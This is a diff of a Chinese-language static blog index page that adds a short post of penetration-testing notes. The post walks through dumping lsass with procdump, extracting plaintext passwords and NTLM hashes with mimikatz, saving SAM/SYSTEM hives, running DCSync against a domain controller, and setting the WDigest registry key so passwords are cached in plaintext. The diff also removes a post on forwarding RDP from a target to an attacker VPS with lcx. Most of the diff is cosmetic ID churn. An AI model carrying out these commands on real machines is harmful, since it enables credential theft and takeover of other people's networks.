@@ -78,6 +78,60 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-procdump" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/01/09/procdump/" class="article-date">
+  <time class="dt-published" datetime="2023-01-09T15:12:29.017Z" itemprop="datePublished">2023-01-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>procdump远程获取dmp<br>    procdump -accepteula  -ma lsass.exe lsass.dmp</p>
+<p>copy lsass.dmp 回本地</p>
+<p>mimikatz 本地读明文<br>    mimikatz.exe “sekurlsa::minidump info_10.130.dmp” “sekurlsa::logonPasswords full” exit &gt; 10.130hash.txt<br>    mimikatz.exe “sekurlsa::minidump lsass10.192.dmp” “sekurlsa::logonpasswords full” exit &gt;lsass10.192.txt<br>    报错：error kuh1_m_sekurlsa_acquireLSA:logon list<br>    遇到这个报错，是 Mimikatz 版本太低</p>
+<p>获取明文的方法<br>    mimikatz<br>        &#x2F;&#x2F;导出sam.hiv和sam.hiv文件（CMD运行）<br>        reg save HKLM\SYSTEM Sys.hiv<br>        reg save HKLM\SAM Sam.hiv</p>
+<pre><code>通过 Mimikatz 加载 sam.hiv 和 sam.hiv 来导出 Hash；
+    mimikatz.exe &quot;lsadump::sam /sam:Sam.hiv /system:Sys.hiv &quot; exit&gt; pwd.txt
+    
+在域控上执行)查看域kevin.com内指定用户root的详细信息，包括NTLM哈希等
+    lsadump::dcsync /domain:kevin.com /user:root
+
+(在域控上执行)读取所有域用户的哈希
+    lsadump::lsa /patch
+
+从sam.hive和system.hive文件中获得NTLM Hash
+    lsadump::sam /sam:sam.hive /system:system.hive
+
+从本地SAM文件中读取密码哈希
+    token::elevate
+    lsadump::sam
+</code></pre>
+<p>特殊情况：<br>    Windows10&#x2F;2012R2 版本：<br>    默认 Windows10 或者 2012R2 以上的，禁止在内存缓存中保存明文密码。<br>    1、修改注册表<br>            修改注册表来让 Wdigest Auth 保存明文口令：<br>            复原把 1 改为 0<br>            reg add HKLM\SYSTEM\CurrentControlSet\ControlSecurity\Providers\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f<br>    2、锁屏或者退出账号<br>            修改注册表需要重启，或者注销账号重新登录。<br>    3、等待目标系统管理员重新登录<br>    4、重新读取密码</p>
+
+        
+          <p class="article-more-link">
+            <a href="/2023/01/09/procdump/#more">Read More</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/01/09/procdump/" data-id="clcrfe761001b7gvpachn9i4b" data-title="" class="article-share-link">分享</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-nslookup" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2023/01/09/nslookup/" class="article-date">
@@ -100,7 +154,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/01/09/nslookup/" data-id="clcre7du70016asvp8rxohuit" data-title="" class="article-share-link">分享</a>
+      <a data-url="http://example.com/2023/01/09/nslookup/" data-id="clcrfe76000187gvp0m7f623t" data-title="" class="article-share-link">分享</a>
       
       
       
@@ -172,7 +226,7 @@ niketo -host www.baidu.com -ssl  -port 443    -evasion 1358
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/01/09/nikto/" data-id="clcre7du70015asvpcg7wc2ru" data-title="" class="article-share-link">分享</a>
+      <a data-url="http://example.com/2023/01/09/nikto/" data-id="clcrfe75z00177gvphio146f5" data-title="" class="article-share-link">分享</a>
       
       
       
@@ -226,7 +280,7 @@ attck
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/01/09/nc/" data-id="clcre7du70014asvphbf73qqs" data-title="" class="article-share-link">分享</a>
+      <a data-url="http://example.com/2023/01/09/nc/" data-id="clcrfe75y00157gvp94ln2xta" data-title="" class="article-share-link">分享</a>
       
       
       
@@ -267,7 +321,7 @@ attck
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/01/09/nbtscan/" data-id="clcre7du60013asvpee696wbl" data-title="" class="article-share-link">分享</a>
+      <a data-url="http://example.com/2023/01/09/nbtscan/" data-id="clcrfe75z00167gvp9izseh85" data-title="" class="article-share-link">分享</a>
       
       
       
@@ -364,7 +418,7 @@ attck
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/01/09/mysql/" data-id="clcre7du60011asvp9bsx9ns5" data-title="" class="article-share-link">分享</a>
+      <a data-url="http://example.com/2023/01/09/mysql/" data-id="clcrfe75y00137gvp0lm50zkm" data-title="" class="article-share-link">分享</a>
       
       
       
@@ -421,7 +475,7 @@ attck
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/01/09/msfvenom/" data-id="clcre7du50010asvp4tvobjik" data-title="" class="article-share-link">分享</a>
+      <a data-url="http://example.com/2023/01/09/msfvenom/" data-id="clcrfe75x00127gvpbiz81mhn" data-title="" class="article-share-link">分享</a>
       
       
       
@@ -487,7 +541,7 @@ attck
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/01/09/mobile/" data-id="clcre7du4000yasvp2urk6mmr" data-title="" class="article-share-link">分享</a>
+      <a data-url="http://example.com/2023/01/09/mobile/" data-id="clcrfe75x00107gvp40iibxiz" data-title="" class="article-share-link">分享</a>
       
       
       
@@ -529,7 +583,7 @@ attck
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/01/09/mimikatz/" data-id="clcre7du4000xasvpasv09aru" data-title="" class="article-share-link">分享</a>
+      <a data-url="http://example.com/2023/01/09/mimikatz/" data-id="clcrfe75w000z7gvp5o4t8ta3" data-title="" class="article-share-link">分享</a>
       
       
       
@@ -570,41 +624,7 @@ attck
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/01/09/masscan/" data-id="clcre7du3000vasvp7y5c73v7" data-title="" class="article-share-link">分享</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-lcx" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/01/09/lcx/" class="article-date">
-  <time class="dt-published" datetime="2023-01-09T15:12:28.717Z" itemprop="datePublished">2023-01-09</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>内网端口转发<br>    target<br>        lcx.exe  -slave VPSIP 4444  127.0.0.1 3389<br>    attck<br>        lcx.exe  -listen 4444 5555<br>本地映射<br>    lcx.exe -tran 53 target IP	3389</p>
-
-        
-          <p class="article-more-link">
-            <a href="/2023/01/09/lcx/#more">Read More</a>
-          </p>
-        
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/01/09/lcx/" data-id="clcre7du2000tasvp0iemefob" data-title="" class="article-share-link">分享</a>
+      <a data-url="http://example.com/2023/01/09/masscan/" data-id="clcrfe75w000x7gvpgjoie1q6" data-title="" class="article-share-link">分享</a>
       
       
       
@@ -673,6 +693,10 @@ attck
       <ul>
         
           <li>
+            <a href="/adminbook">Adminbook</a>
+          </li>
+        
+          <li>
             <a href="/MS17-010">MS17-010</a>
           </li>
         
@@ -686,10 +710,6 @@ attck
         
           <li>
             <a href="/2023/01/09/zzcms%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2023/01/09/ZimbraNote/">(no title)</a>
           </li>
         
       </ul>
